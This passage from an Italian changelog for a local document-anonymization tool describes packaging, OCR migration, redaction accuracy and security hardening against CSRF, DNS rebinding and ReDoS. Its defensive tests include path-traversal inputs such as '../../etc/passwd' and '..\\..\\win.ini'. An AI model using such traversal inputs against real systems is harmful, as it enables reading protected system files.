dire sì/no; dal momento in cui il pacchetto viene **pubblicato** non va più
bene — si distribuirebbe un `THIRD_PARTY.md` che non descrive ciò che c'è
dentro, e lì dentro c'è pystray, che è LGPL. Ora le licenze si rigenerano
nel runner e il controllo torna acceso invece di essere saltato.

### Microsoft Store

L'avviso «editore sconosciuto» si toglie gratis in un modo solo: pubblicare
un **MSIX**, che lo firma Microsoft dopo la certificazione.

L'altra voce di Partner Center, «EXE or MSI app», sembrava la scorciatoia e
non lo era: per quella via l'installer dev'essere già firmato Authenticode
da noi, cioè serve esattamente il certificato che è stato messo da parte
perché costa.

Nome **Mr. Rao** prenotato, `packaging/AppxManifest.xml` con l'identità
assegnata dallo Store, tredici immagini versionate, e il pacchetto che si
costruisce nella stessa build dello zip — costruirli in due momenti diversi
vorrebbe dire due prodotti che si chiamano uguale.

Le dieci associazioni di file sono **dichiarate** invece che scritte nel
registro: in MSIX il registro è virtualizzato, ed è anche il motivo per cui
disinstallare non lascerà voci orfane, cosa che con lo script è successa.
**Nessuna capability di rete**, ed è una scelta: la scheda dello Store
mostra le autorizzazioni a chi installa, e chiederne una che non serve
contraddirebbe la sola cosa che questo programma promette, proprio nel punto
in cui la gente decide se fidarsi.

La prima sottomissione si fa a mano — l'automazione aggiorna, non
inserisce — e la catena automatica esiste ma è **spenta**: si accende
scrivendo `si` in un campo. Il perché sta in [`STORE.md`](STORE.md).

Un errore che vale la pena raccontare: MakeAppx enumerava 2 750 file e poi
rispondeva `0x8007007b — nome di file non valido`, **senza dire quale**. Era
python-docx, che spedisce il proprio modello anche scompattato e lì dentro
ha un `[Content_Types].xml`, nome riservato da MSIX. Ora `nomi_illegali()`
scorre il layout e **nomina i file**, con il motivo, in mezzo secondo:
venti minuti di CI per sapere che «qualcosa non va» non devono più poter
succedere.

### Il gate ha imparato tre cose che non sapeva vedere

**Una funzione senza documentazione non passa più.** Era già successo due
volte: dieci riconoscitori anglosassoni usciti nella 1.8.0 senza mai entrare
nella tabella di `PRIVACY.md`, e i documenti d'identità spediti mentre il
backlog li dava ancora da fare. Tutte e due le volte il gate diceva verde,
perché guardava versioni, conteggi e link — cose che con una funzione nuova
non c'entrano niente. Ora ogni segnaposto che il motore può emettere dev'essere
in `PRIVACY.md`, e ogni opzione della riga di comando in `CLI.md`, con il
parser **interrogato** e non letto con un'espressione regolare.

Ciò che i due controlli hanno trovato subito: i dieci segnaposto
anglosassoni, e `docs/CLI.md`, che non esisteva — venti opzioni su ventidue
non erano scritte da nessuna parte.

**Una versione senza voce di changelog è un errore.** Era già successo. Si
aggancia alle intestazioni e non a una ricerca del numero nel testo, perché
qui le voci si citano a vicenda. Zero intestazioni riconosciute = errore,
non «pulito»: se un giorno il formato cambia, senza quel ramo il controllo
direbbe verde per sempre.

**`compileall` vede la sintassi, non il caricamento.** `check_import.py`
importa i moduli **uno per uno**, svuotando `sys.modules` fra l'uno e
l'altro: senza, il primo import tira dentro gli altri e una coppia circolare
passa inosservata (misurato). Gira in CI, nel gate locale e in un hook
pre-commit **opzionale** che costa mezzo secondo — un hook lento non viene
tolto, viene aggirato con `--no-verify`, e da quel momento non gira più
nemmeno la metà veloce.

### CodeQL, una segnalazione per volta

**`js/double-escaping` — difetto vero, corretto.** L'anteprima riconosceva
le citazioni sul testo già scappato e poi lo riportava indietro a colpi di
`replace`: un documento che contiene scritto per davvero `&quot;` ne usciva
con un apice doppio. Testo cambiato, non un problema estetico.

**`py/polynomial-redos` — ripulite, senza vantarsi.** Sei espressioni
usavano `\s` dove intendevano lo spazio orizzontale. Detto onestamente: non
sono riuscito a produrre un ingresso che rallentasse davvero quelle vecchie.
È un cambio di correttezza, non una falla chiusa. E la prima versione della
correzione era **peggiore** dell'originale — da istantaneo a 885 ms — cosa
che si è saputa solo perché è stata misurata nel verso giusto, provando a
peggiorare e guardando dove si muoveva il numero.

### Documenti

I due README dicevano «cinque passaggi» mentre il gate ne fa sei: il
controllo sull'import è entrato e la descrizione è rimasta indietro.

**859 test.**

---

## 1.10.0 — Non tutto finisce dentro un prompt

Fino a ieri l'uscita era `.md` e `.txt`, e questo legava Mr. Rao a un caso
d'uso solo: incollare in un'AI. Ma un atto da pubblicare all'albo pretorio,
un contratto da depositare, una delibera anonimizzata **devono restare
documenti** — in Markdown non lo sono.

Da questa versione si esporta anche in **`.docx`**.

### La cosa da capire prima di usarlo

**Non è il documento originale con sopra dei rettangoli neri.** Quella è la
trappola classica della redazione: i rettangoli si tolgono e il testo è
ancora lì sotto, e ogni anno qualcuno pubblica un atto giudiziario così.

Qui il documento viene **rigenerato dal Markdown già redatto**: il dato non è
coperto, è assente. Il prezzo è l'impaginazione dell'originale, che si perde.
È scritto nel suggerimento del pulsante, non solo qui.

### Cosa si converte

Il sottoinsieme di Markdown che Mr. Rao *produce*: intestazioni, paragrafi,
elenchi puntati e numerati, tabelle, citazioni, righelli, blocchi di codice,
grassetto e corsivo. Quello che il convertitore non genera non è gestito, e
non si finge il contrario.

Nove test, e quello che controllano non è «il file si apre» ma che il
documento consegnato **non contenga i dati personali** — celle delle tabelle
comprese, perché un dato lasciato in una cella non è meno leggibile di uno
lasciato in un paragrafo. Uno prova a passare `../../etc/passwd` come nome
del file.

`python-docx` è MIT e tira dietro solo `lxml` (BSD-3-Clause): nessun copyleft
nuovo.

### Una demo in cima al README

Dieci secondi, 398 KB: un `.eml` trascinato, la conversione, i segnaposto, e
il confronto prima/dopo. I dati sono inventati — su uno strumento che esiste
per proteggere quelli veri, una demo con dati reali sarebbe un autogol.

Nel fotogramma finale si vedono anche `Protocollo interno: 0123456789` e
`Registrata il 01.02.2024` **non** redatti: è la parte difficile da
raccontare a parole, cioè che il motore non redige quello che non deve.

### Documenti

`ARCHITECTURE.md` non elencava `i18n.py` — stava indietro dalla 1.8.0 — né il
nuovo `docx_export.py`. Trovati con un confronto fra i moduli citati e quelli
che esistono davvero, non rileggendo il documento.

**705 test.**

---

## 1.9.0 — Il motore OCR perdeva gli spazi, e con loro i dati personali

Il pacchetto OCR che usavamo, `rapidocr_onnxruntime`, è stato **rinominato**:
è fermo alla 1.2.3 e non riceverà più niente, correzioni di sicurezza
comprese. Il progetto continua come `rapidocr`, oggi alla 3.9.2.

Sembrava manutenzione. Non lo era.

**La stessa immagine, letta dalle due versioni:**

```
1.2.3  IBANTT60X0542811101000000123456
       PartitaIVA12345678903-tel.+390951234567

3.9.2  IBAN IT60X0542811101000000123456
       Partita IVA 12345678903 - tel. +39 095 123 4567
```

La versione che avevamo in produzione **perdeva gli spazi fra le parole** e
confondeva `I` con `T` e con `f`. Per un motore di redazione non è un
dettaglio estetico: i riconoscitori lavorano sui confini di parola.

Passando quei due testi allo stesso filtro privacy:

| testo letto da | dati personali rimossi |
|---|---|
| OCR 1.2.3 | **1** — solo il codice fiscale |
| OCR 3.9.2 | **4** |

Con il vecchio motore, su quel documento **IBAN, partita IVA e numero di
telefono restavano in chiaro**. E `IBANTT60` falliva per forza il controllo
del codice Paese introdotto nella 1.8.0 proprio per non inventare IBAN.

### Cosa è cambiato nel codice

L'API non è compatibile, contrariamente a quanto sembra. La 3.x restituisce
un oggetto `RapidOCROutput` invece della tupla `(result, elapse)`: il vecchio
`result, _ = ocr(path)` alza `TypeError`, e il testo ora sta in `.txts`.

`onnxruntime` va dichiarato esplicitamente: dalla 3.x non è più una
dipendenza di `rapidocr`, e senza di esso il primo `RapidOCR()` muore. I
modelli **PP-OCRv6** viaggiano dentro la wheel, quindi al primo avvio non si
scarica niente — cosa che per un programma che promette di non usare la rete
non è un dettaglio.

### Il motore parlava troppo

Appena costruito, scriveva nove righe di INFO sulla console, e fra queste il
percorso completo dei modelli — che su Windows **contiene il nome
dell'utente**. Su uno strumento che esiste per non far uscire i dati, un
output di console incollato in una segnalazione non deve dire chi sei. Ora
tace.

### Il buco nei test che questa migrazione ha rivelato

I 693 test passavano **anche con il motore OCR completamente rotto**: tutti
sostituiscono `ocr_image` con una funzione che restituisce testo finto. Vanno
benissimo per provare cosa fa il convertitore *dato* un testo, ma nessuno
toccava il motore vero.

Aggiunto `tests/test_ocr_motore.py`: tre prove che fanno leggere al motore
vero un'immagine costruita sul momento — che legga, che non incolli le parole
fra loro, che non stampi percorsi. Verificati rossi sul codice precedente
prima di considerarli fatti.

**696 test.**

---

## 1.8.0 — Quello che nessuno aveva mai misurato

Il banco di prova erano due testi scritti da noi: una mail dove tutto
doveva sparire, un verbale dove non doveva sparire niente. Passavano
entrambi, e per mesi è bastato.

Poi abbiamo puntato il motore su un **modulo fiscale statunitense in
bianco**, scaricato dall'IRS. Un foglio senza un solo dato personale.

```
22 redazioni
```

Ventidue. Su un documento vuoto. Diventavano `{{NAME}}` cose come
*Federal Tax Return* e *Internal Revenue Service*.

Il banco fatto in casa non l'aveva mai visto, e non poteva: **un corpus
scritto a mano contiene solo le trappole a cui chi lo scrive ha
pensato.** Un modulo dell'Agenzia delle Entrate contiene quelle a cui
non penseremmo mai.

### Il conto vero

Costruito un banco su documenti veri — moduli fiscali italiani e
americani in bianco, Gazzette Ufficiali dal 1890, volumi statistici — dove
**la risposta giusta è zero**, quindi ogni sostituzione è un errore senza
bisogno di giudicarlo a occhio. Più 6 000 messaggi di mailing list
italiane e 1 500 inglesi, per la prosa vera.

| | prima | dopo |
|---|---|---|
| falsi positivi sui nomi | **6 339** | **1 637** |
| IBAN inventati dal recupero OCR | 12 | **0** |

**L'euristica dei cognomi è spenta di default.** «Due parole maiuscole
che non sono parole italiane» produceva 8 904 sostituzioni sbagliate su
venti moduli dell'Agenzia delle Entrate e 14 376 su otto Gazzette
storiche. Resta accendibile per lettere e contratti, dove serve
davvero — ma il valore predefinito cambia, ed è il motivo per cui questa
è una 1.8 e non una 1.7.3.

**Il riconoscimento dei nomi ragiona per livelli di prova.** Prima
bastava che *una* parola di una sequenza fosse negli elenchi perché
l'intera sequenza sparisse — e gli elenchi contengono «Chiesa», «Costa»,
«Monte», «Villa». Ora servono due riscontri, oppure un contesto che
dichiari la persona: un titolo, una firma, un indirizzo di posta
accanto. Quello che non si riesce a provare diventa un **sospetto**: il
documento resta leggibile e chi controlla sa dove guardare.

**Lettera o modulo cambiano la regola.** Su una lettera un riscontro solo
basta; su un modulo è quasi sempre l'etichetta di un campo. Non esiste un
valore giusto per entrambi, quindi Mr. Rao lo deduce dal file — le email
sono prosa, i fogli di calcolo sono moduli, e nei PDF conta le caselle
disegnate sulla pagina. Il segnale sta nel PDF e muore nella conversione
in testo: un primo tentativo di indovinarlo dal testo estratto
classificava 79 moduli fiscali su 99 come prosa.

**L'IBAN non si fida più del solo mod-97.** Quel controllo scarta 96
candidati su 97, che su un volume pieno di codici lunghi non basta: il
recupero OCR *inventava* IBAN su documenti che non ne contenevano. Ora
servono anche il codice Paese e la lunghezza attesa per quel Paese.

### Fuori dall'Italia

Il motore riconosce i formati anglosassoni: **NHS number** (mod-11),
**National Insurance number**, **SSN** e **ITIN**, **routing bancario
ABA**, **SIN** canadese, **ABN** e **TFN** australiani, codice postale
britannico, indirizzi con Street e Road, e la **zona a lettura automatica
dei passaporti** — che contiene cognome, nome, cittadinanza e data di
nascita tutti insieme.

Ognuno con il suo validatore dove esiste. Dove non esiste lo diciamo: su
20 000 sequenze casuali di nove cifre, il controllo strutturale del SSN
ne accetta l'89% e quello dei telefoni americani il 63%. Non sono
validatori, sono filtri di forma, e infatti niente si sostituisce sulle
cifre nude senza una parola di contesto accanto.

I riconoscitori sono divisi in **pacchetti** — nucleo universale,
italiani, anglosassoni — cumulabili e scegliibili dall'interfaccia. Il
nucleo non si spegne: l'IBAN passa il mod-97 in tutti i Paesi SEPA.

### L'interfaccia parla due lingue

Italiano e inglese, scelte dal browser e cambiabili con un clic. **Anche
il documento prodotto**: le intestazioni delle email, le note dell'OCR,
i titoli delle tabelle. Uno schermo inglese e un file italiano sarebbe
stato metà lavoro.

I segnaposto restano quelli: `{{CODICE_FISCALE}}` non diventa
`{{TAX_CODE}}`. Nominano lo strumento, non l'interfaccia.

### Due difetti trovati per strada

Un `.eml` con un a capo nell'oggetto poteva scrivere sopra la tabella una
riga `| **Da** | banca@truffa.it |` — un mittente inventato, leggibile
come se fosse vero. E un file ancora in scrittura nella cartella
sorvegliata veniva convertito **a metà**, producendo un `.md` ben formato
con dentro solo la prima parte: anonimizzare mezzo documento senza
accorgersene.

### In breve

- 693 test (erano 390)
- `name_guess` spenta di default — **cambia il comportamento**
- pacchetti di riconoscitori scegliibili, formati anglosassoni
- interfaccia e documento in due lingue
- banco su documenti veri, non più solo su testi scritti da noi


## 1.7.2 — Quello che il programma sapeva e non diceva

Il tasto destro converte un documento e mette il `.md` accanto
all'originale. È il modo più comodo di usare Mr. Rao, quindi è quello che
la gente usa — e fino a ieri era anche l'unico che **nascondeva metà del
risultato**.

Su un file con un codice fiscale storpiato dallo scanner:

```
> prova.txt...
  ok (markitdown, redactions=2)
```

Poi la finestra si chiudeva all'istante, perché `open_with_mr_rao.bat`
finiva con `if errorlevel 1 pause` — si fermava **solo** se qualcosa andava
storto. Restava un file e nient'altro.

Questo, invece, il programma lo sapeva già:

```
sospetti:
  codice_fiscale  RS************2X
     sedici caratteri con la proporzione di un codice fiscale,
     ma la struttura non torna: possibile lettura OCR sbagliata
```

**Due dati personali erano rimasti nel documento**, deformati ma leggibili
da una persona. Il motore li aveva visti, sapeva spiegare perché, e non lo
diceva a nessuno: i sospetti vivevano solo nell'interfaccia web.

`PRIVACY.md` dichiara che «zero redazioni non significa documento pulito» e
la FAQ che il confronto prima/dopo «è il controllo che conta». Il percorso
più comodo saltava entrambe le cose in silenzio. Non era una scomodità: era
il prodotto che contraddiceva il proprio documento.

Adesso la riga di comando stampa tipo, campione mascherato e motivo di ogni
sospetto, e la finestra si ferma quando c'è qualcosa da leggere.

**Su un documento pulito continua a chiudersi da sola.** Fermarsi anche a
mani vuote insegnerebbe a chiudere senza leggere, che è peggio di non
fermarsi: dopo tre «niente da segnalare» nessuno legge più il quarto.

Due dettagli pagati subito:

- la maschera usa `*` e non il pallino `•` dell'interfaccia web. In una
  console italiana quel carattere non esiste e diventerebbe un punto
  interrogativo — cioè esattamente il segno che indica un guasto;
- `--attendi` non blocca quando nessuno può premere un tasto. Senza quella
  guardia una conversione in uno script sarebbe rimasta appesa per sempre.

### Come è nata

`P0` stava in cima al backlog da mesi con questa motivazione: *«tasto destro
→ apri l'interfaccia col risultato, perché l'utente si aspetta il browser»*.

Era un'assunzione. La persona che lo usa tutti i giorni ha detto il
contrario — *«mi piace il tasto destro che genera direttamente il documento
anonimizzato, è semplice ed efficace»* — e aveva ragione: per il caso più
frequente il browser è un passaggio in più, non uno in meno.

Il difetto vero stava dall'altra parte, e si vedeva solo usandolo.

**389 test** (erano 384).

## 1.7.1 — Il file che avevi aperto

Tutto quello che c'è qui dentro è uscito da qualcuno che **usava** il
programma, non da qualcuno che lo leggeva.

### «Failed to fetch» era il file aperto in Word

Convertire un documento che si ha aperto è una delle cose più naturali del
mondo. Word lo tiene bloccato in lettura, e Mr. Rao rispondeva così:

```
Traceback (most recent call last):
  ...
PermissionError: [Errno 13] Permission denied: 'Verbale_2026-06.docx'
```

Dal browser arrivava anche peggio: **«failed to fetch»**, che dà la colpa
alla rete mentre il server sta benissimo e la richiesta non è mai partita —
il browser non era riuscito a *leggere* il file.

Due messaggi, uno inutile e uno fuorviante, per una situazione che capita a
chiunque il primo giorno. Adesso:

> ⚠️ **Il file è aperto in un altro programma.**
> `Verbale_2026-06.docx` è bloccato — succede quando il documento è aperto
> in Word, Excel o PowerPoint. **Chiudilo e riprova.**

Il nome del file c'è di proposito: chi ne converte dieci in fila deve sapere
quale dei dieci.

### L'installazione da sorgente non creava niente, e non lo diceva

`%~dp0` finisce con una barra rovescia, e per il parser della riga di
comando di Windows `\"` è una virgoletta **protetta**, non la chiusura
della stringa. Passando `-InstallDir "%~dp0"` l'intera riga collassava:

```
InstallDir = [C:\...\markitdown-webapp" -Avvio C:\...\Avvia]
Avvio      = [Mr]
ApriCon    = [Rao.bat -ApriCon ...]
```

Lo script riceveva `-Avvio` valorizzato `Mr`, non trovava il file, e usciva
in errore **senza creare un solo collegamento**. L'installazione precedente
restava al suo posto, quindi sembrava che non fosse successo niente.

Ora c'è un test che vieta la trappola: nessun argomento fra virgolette può
finire con una barra, sulle righe che invocano powershell. Solo lì — in
`xcopy "%OUT%\app\"` la barra finale significa «è una cartella», e un
controllo su tutte le righe segnalava sei punti giusti e uno sbagliato.

### Una sola strada per i collegamenti

L'installazione da sorgente aveva due script propri che facevano quello che
`mr_rao_shell.ps1` fa già per il pacchetto — e quel file esiste proprio
perché l'elenco delle estensioni una volta viveva in due posti e la
disinstallazione ne conosceva uno solo. Correggerne uno e lasciare indietro
l'altro è lo stesso difetto, un piano più su.

Ora i percorsi sono parametri, perché le due installazioni sono davvero
diverse: il pacchetto ha un `MrRao.exe` con l'icona dentro, il sorgente ha
un `.bat` di avvio, un secondo `.bat` che accetta un file e un `.ico` a
parte. I valori predefiniti sono quelli del pacchetto, quindi per lui non
cambia nulla.

**E adesso è sotto test** (P2.3, la voce rimasta scoperta più a lungo). Non
per pigrizia: quello script scrive sul Desktop e nel registro, e un test che
lo esegue davvero sporca la macchina di chi lo lancia. Il passaggio `-Prova`
scioglie il nodo — sa dire cosa farebbe senza farlo.

### Il pacchetto si costruisce anche in una macchina che non possiede niente

Workflow `Portable` (P2.9). Parte **senza venv**: se una libreria manca
dall'elenco delle dipendenze, manca anche dal pacchetto, e la verifica se ne
accorge convertendo un `.docx`, un `.xlsx` e un `.pptx` veri — uno per
libreria opzionale, mentre prima ne provava uno solo.

È la lezione della 1.7.0 messa in pratica: per tre release quelle librerie
sono finite nel pacchetto **per caso**, perché erano nel venv di sviluppo.
Un gate che gira sulla stessa macchina che ha il problema non può vederlo.

### I documenti non possono più invecchiare in silenzio

`scripts/check_docs.py`, quinto passo del quality gate. Parte da
`git ls-files` — non dall'elenco dei file che si stanno modificando — e
controlla quattro cose: nessun identificativo duplicato nel backlog, link
relativi che esistono, versioni citate coerenti con `APP_VERSION`, conteggi
di test veri.

Nasce da un errore: alla domanda «i documenti sono aggiornati?» avevo
risposto di sì guardando quelli che stavo modificando. Due erano fermi a
quindici release prima. **Un controllo che parte da ciò che si ha già in
mano trova solo ciò che si è già guardato.**

Si è guadagnato il posto al primo giro, bocciando i README che dichiaravano
un numero di test già superato.

### Correzioni minori

- La FAQ diceva che il motore lascia intatti «ruoli, **importi (se non
  disattivati)**», che si legge come *gli importi si tolgono finché non li
  spegni*. È il contrario: sono spenti di default, perché in una fattura di
  solito servono. Riscritto con ciò che resta **sempre** — ruoli, fatti,
  struttura, cronologia degli eventi.
- I README promettevano il menu contestuale «su **undici** tipi di file». Le
  estensioni sono dieci: l'undici era il numero di chiavi di registro, che
  include quella per *tutti* i file. Un conteggio interno diventato una
  promessa, sbagliato in entrambi i versi — perché con quella chiave la voce
  compare su qualsiasi file.
- `quality_gate.ps1` era una seconda implementazione del gate, ferma a tre
  passi su cinque, e non la chiamava nessuno. Ora invoca `quality_gate.bat`,
  che resta l'unica definizione.

**384 test** (erano 382).

## 1.7.0 — Le difese che c'erano, dove non arrivavano

Nessuna funzione nuova: cinque punti in cui i presidi esistenti si fermavano
un passo prima. Ognuno è stato verificato disattivandolo, per controllare che
il suo test diventasse rosso invece di restare verde per caso.

### Il controllo anti-CSRF non scattava sempre

```python
origin = request.headers.get("Origin")
if origin and request.method not in ("GET", "HEAD", "OPTIONS"):
```

**`if origin`.** Niente header, niente controllo — e una navigazione da
`<form>` cross-site può arrivarci senza. Gli endpoint accettano
`multipart/form-data`, che è CORS-safelisted: nessun preflight a fermarla.

Adesso si guarda prima `Sec-Fetch-Site`, che i browser attuali mandano su
ogni richiesta. `Origin` resta come ripiego per chi non lo manda: curl, la
CLI, un browser vecchio.

Ne è uscito un secondo caso, che non era in preventivo. Per `localhost` i
browser considerano **stessa site** anche una porta diversa: una pagina
servita da un altro programma su `127.0.0.1:8080` ha il nostro stesso
hostname, quindi il controllo su `Origin` la lasciava passare. Ora è
rifiutato anche `same-site`.

### Esporsi in rete non deve spegnere la difesa anti-rebinding

Con `MR_RAO_HOST=0.0.0.0` l'allow-list degli host diventava `*`: la difesa
spariva **esattamente quando l'app si esponeva**. Una pagina ostile che si
faceva risolvere sull'IP della macchina tornava a poter *leggere* le risposte
— cioè i documenti convertiti, che è tutto ciò che c'è da proteggere qui.

Adesso l'allow-list contiene gli indirizzi e i nomi di questa macchina.
L'accesso legittimo per IP o per nome passa; il dominio dell'attaccante, che
nell'header `Host` porta il proprio, no. Dietro un reverse proxy serve
`MR_RAO_ALLOWED_HOSTS`, e il 403 lo dice invece di lasciare indovinare.

### Una chiave di firma che nessuno userà per sbaglio

`SECRET_KEY` era la costante `"mr-rao-local-dev-only"`, scritta in un
repository pubblico. Oggi non la usa niente — nessuna sessione, nessun
cookie firmato — ed è proprio questo il problema: il giorno che qualcuno
scrive `session[...]`, che in Flask è una riga, quella costante diventa la
chiave con cui si firmano i cookie, e **non si rompe niente** che lo faccia
notare.

Ora è casuale a ogni avvio e non tocca il disco. Un file sarebbe stato
peggio della costante: seguirebbe l'eseguibile portable dentro OneDrive, nei
backup e nello zip che passa a un collega.

### Intestazioni, con aspettative oneste

`frame-ancestors 'none'`, `nosniff`, `no-referrer` su ogni risposta.

Quella che si guadagna il posto è la prima: impedisce di incorniciare
l'applicazione in un'altra pagina. Il contenuto non sarebbe comunque
leggibile — c'è la same-origin policy — ma il **clic** sì, e qui un clic
accende il monitoraggio di una cartella. `nosniff` ha poco da mordere finché
ogni endpoint risponde JSON: vale come rete per quelli che verranno.

### Un OCR non tiene più occupato un worker per mezz'ora

`MR_RAO_OCR_TIMEOUT`, 15 minuti di default, `0` per toglierlo.

Un thread Python non si uccide dall'esterno, quindi il limite si è messo
dove già si legge il flag di annullamento: **fra una pagina e l'altra**.
Ferma le pagine successive, non quella in corso.

Allo scadere il testo letto fin lì si restituisce, con un avviso **in cima**:

> ⚠️ **OCR interrotto dopo 12 pagine su 50:** superato il limite di tempo.
> Il testo qui sotto è parziale, e con esso la rimozione dei dati personali.

In cima e non in fondo perché un documento troncato in silenzio è peggio di
nessun documento: l'anonimizzazione ha visto solo le pagine lette, e chi legge
deve saperlo *prima* di fidarsi. Per la stessa ragione un OCR scaduto senza
aver letto niente non dice più «nessun testo riconoscibile», che manderebbe
a cercare il problema nel documento invece che nel tempo.

### Un documento non deve poter piantare il convertitore

CodeQL segnalava `py/polynomial-redos` sulla pulizia del testo per
l'incolla-in-chat. Non era un falso positivo:

```python
re.sub(r"<!--.*?-->", "", text, flags=re.DOTALL)
```

Con un documento fatto di `<!--` mai chiusi il motore riparte da ogni
apertura e arriva ogni volta in fondo. Misurato: 32 mila caratteri in
492 ms, 80 mila in 3,2 secondi — due volte e mezzo l'ingresso, sei volte e
mezzo il tempo. Il limite d'invio è 50 MB, e il documento lo sceglie chi lo
carica.

Nessuna riscrittura dell'espressione lo risolve, perché a essere quadratico
è il *numero di partenze*, non il singolo tentativo. Due `find` che
avanzano sempre in avanti sono lineari: **0,29 ms** sullo stesso ingresso.
Stessa correzione nel gemello JavaScript, dove il prezzo era la scheda del
browser che si pianta.

Le note che l'applicazione scrive di suo sono ora ancorate a inizio riga —
prima `\n?` davanti rendeva ambiguo dove cominciasse il match, ed era la
seconda segnalazione.

### Gli altri dodici alert, chiusi con la ragione scritta

Restavano dodici segnalazioni. Nessuna era sfruttabile, ma per due motivi
diversi — ed è la distinzione che rende il triage una cosa seria invece che
un'archiviazione:

- **sette falsi positivi.** CodeQL segue il nome del file caricato fino a
  una scrittura su disco. Il flusso esiste, ma l'unica parte controllata è
  `Path(filename).suffix`, che **non può contenere un separatore** — provato
  con `../../../etc/passwd`, `a.pdf/../../x`, `..\..\win.ini` — e il nome
  del file lo sceglie `tempfile.mkstemp` nella cartella temporanea. Sopra
  c'è una seconda barriera indipendente: `ALLOWED_EXTENSIONS`;
- **cinque scelte consapevoli.** I percorsi del monitoraggio non sono
  confinati perché la hotfolder deve poter stare dove serve; il bind largo
  è la sonda che controlla se la porta è libera; il tooltip usa `innerHTML`
  perché sei di essi contengono `<b>` e la sorgente è un template.

Le motivazioni stanno **anche nel codice**, non solo nella scheda Security:
chi clona il repository si porta dietro i file, non l'interfaccia di GitHub.
E ognuna dice a quale condizione l'alert va riaperto — una chiusura
sopravvive al codice che l'ha giustificata, ed è lì che il triage marcisce.

Lasciarli aperti non era prudenza: dodici «high» permanenti su un
repository pubblico dicono una cosa falsa a chi guarda, e insegnano a non
guardare più. È così che il tredicesimo non lo vedi.

### Una FAQ per chi cerca l'overclaim

`docs/PRIVACY_FAQ.md` — undici domande di chi apre il repository per
trovarci una promessa più grande del codice. Comincia rispondendo **no**
alla domanda che farebbe più comodo («è anonimizzazione GDPR?»).

Ci è entrata una cosa che prima non era scritta da nessuna parte: i
segnaposto **non sono numerati**, quindi due persone diverse diventano lo
stesso `{{NAME}}`. In uscita non si può ricollegare chi era chi — non esiste
nessuna mappa da custodire, perché non viene mai costruita. Ma un documento
**spezzato in pezzi** perde il contesto fra un blocco e l'altro, e un nome
riconosciuto sul testo intero può sopravvivere in un frammento. Conviene
convertire il documento intero e incollare il risultato, non convertire i
pezzi.

Gli esempi della pagina sono sotto test, come già quelli del README: se il
codice cambia e la pagina no, la suite lo dice prima che se ne accorga un
lettore.

### Italiano scritto da chi l'italiano lo parla

Una passata su tutti i testi pubblici, dopo una segnalazione precisa: parole
tradotte troppo alla lettera, di quelle che fanno pensare a un testo mai
riletto da nessuno.

| Prima | Dopo | Perché |
|-------|------|--------|
| «un **attrezzo** locale» | «un **tool** locale» | un attrezzo è da officina; «tool» si usa anche in italiano |
| «la **schermatura** dei dati» | «l'**anonimizzazione**» | si scherma un cavo, non un dato personale |
| «spento **di serie**» | «spento **di default**» | l'interfaccia diceva già «di default»: era il documento a essere fuori posto |
| «a ogni **confine di stadio**» | «al passaggio da uno stadio all'altro» | *stage boundary* tradotto parola per parola |
| «riconoscitori **innestabili** per Paese» | «estendibili ad altri Paesi» | *pluggable* tradotto parola per parola |
| «**Chi serve** un pipeline» | «**A chi serve** una pipeline» | in italiano «chi serve» significa il contrario; e pipeline è femminile |
| «due **confusions** tipiche» | «due confusioni tipiche» | parola inglese rimasta in mezzo |
| «classificazione automatica **a scala**» | «su larga scala» | *at scale* |
| «quasi-**identifier**» | «quasi-identificatori» | il termine italiano esiste ed è quello |
| «Avvia **sorveglianza**» | «Attiva **monitoraggio**» | vedi sotto |

E una frase proprio sgrammaticata, in `SECURITY.md`: «i parser che legge sono
gli stessi **che gira** qualunque altro programma».

Ridotto anche l'uso di «presidio»: è gergo legittimo, ma dodici volte in sei
pagine è un tic, non un termine.

### «Avvia sorveglianza» → «Attiva monitoraggio»

*Sorvegliare*, in italiano, ha addosso la polizia: sorveglianza speciale,
videosorveglianza. In un tool il cui argomento è **proteggere i dati delle
persone**, un bottone «Avvia sorveglianza» manda il segnale opposto.

«Attiva» e non «Avvia» perché lo stato lì accanto diceva già «non attiva»:
il registro c'era, era il bottone a non seguirlo. Di conseguenza «Ferma» è
diventato «Disattiva», che è la parola che fa coppia.

La rinomina ha tirato dietro una cosa che un cerca-e-sostituisci avrebbe
lasciato lì: gli stati erano al **femminile** perché concordavano con
«sorveglianza» — `"non attiva"`, `"ferma"`. Con «monitoraggio» restavano
sgrammaticati. Nove punti fra interfaccia, messaggi Python e documenti.

### Mr. Rao anonimizzava se stesso

In fondo a ogni email convertita c'era:

```
> 🛡️ *Documento elaborato da Mr. {{NAME}}.*
```

«Mr.» è un titolo esattamente come «Dott.» o «Ing.», e quella nota veniva
scritta **prima** del filtro privacy, quindi il filtro la leggeva come
contenuto dell'utente.

La battuta si racconta da sola. Il danno no: quella sostituzione **entrava
nel conteggio**. Su ogni singola email il numero di redazioni che chiediamo
all'utente di controllare era gonfiato di uno — e «🛡️ 3 redazioni» su un
documento che ne aveva davvero 2 è esattamente il tipo di numero su cui
questo progetto ha costruito il resto del discorso.

Ora la nota si aggiunge a valle della sostituzione: è testo nostro, non ha
niente da farsi riconoscere dentro.

### Word ed Excel: il pacchetto giusto, non quello ovvio

Una release fa, un commit intitolato *«Word, Excel and PowerPoint never
worked»* dichiarava risolti i formati Office aggiungendo `python-docx` alle
dipendenze. Su una macchina pulita **non funzionavano lo stesso**: per il
`.docx` MarkItDown importa **`mammoth`**, e `python-docx` non lo usa
nessuno. Mancava anche `pandas`, che serve a `.xlsx` e `.xls` insieme a
openpyxl e xlrd.

In locale era verde perché il venv di sviluppo aveva già mammoth e pandas
da un'installazione precedente. L'ha vista la CI, che parte pulita — ed è
tutto quello che la CI deve fare.

La conseguenza peggiore non era la build rossa. `FORMAT_DEPENDENCIES`
diceva `".docx": ("docx", "python-docx")`, quindi su quella macchina
rispondeva **«non manca niente» mentre mancava tutto**; e se avesse
parlato, avrebbe consigliato di installare un pacchetto che non c'entra.
Un suggerimento sbagliato è peggio di nessun suggerimento.

Adesso i nomi sono presi dai sorgenti dei converter, con scritto accanto
quale file li importa, un formato può dichiarare più dipendenze, e un test
nuovo controlla che ogni pacchetto dichiarato necessario sia anche in
`requirements.txt`. Verificato dove conta: venv vuoto, `pip install -r
requirements.txt`, **355 test verdi** e `python-docx` mai installato — poi
tolto `mammoth` per vedere cadere i quattro test giusti.

### Cosa è stato valutato e scartato

- **Confinare i percorsi del monitoraggio.** Romperebbe la funzione: la
  hotfolder deve poter stare nei Documenti o su un disco di rete, e c'è un
  selettore di cartelle nativo apposta. Il danno massimo resta comunque
  qualche cartella e dei file `.md` nuovi, mai una sovrascrittura.
